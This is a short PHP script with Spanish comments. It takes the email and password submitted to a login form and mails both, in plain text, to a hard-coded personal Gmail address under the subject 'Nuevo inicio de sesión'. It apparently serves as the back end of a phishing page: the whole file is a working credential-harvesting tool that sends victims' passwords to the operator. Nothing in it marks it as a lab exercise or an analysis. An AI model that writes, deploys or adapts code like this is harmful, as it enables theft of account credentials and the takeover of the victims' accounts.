<?php
// Configura los parámetros del correo
$to = 'joseblandon885@gmail.com'; // Dirección de correo del destinatario
$subject = 'Nuevo inicio de sesión'; // Asunto del correo
$headers = "From: joseblandon885@gmail.com\r\n";
$headers .= "Reply-To: joseblandon885@gmail.com\r\n";
$headers .= "Content-Type: text/html; charset=UTF-8\r\n";

// Obtén los datos del formulario
$email = isset($_POST['email']) ? htmlspecialchars($_POST['email']) : '';
$password = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : '';

// Crea el contenido del correo
$message = "
<html>
<head>
    <title>Nuevo inicio de sesión</title>
</head>
<body>
    <p><strong>Email:</strong> $email</p>
    <p><strong>Password:</strong> $password</p>
</body>
</html>
";

// Envía el correo
if (mail($to, $subject, $message, $headers)) {
    echo 'El correo ha sido enviado correctamente.';
} else {
    echo 'Hubo un error al enviar el correo.';
}
?>
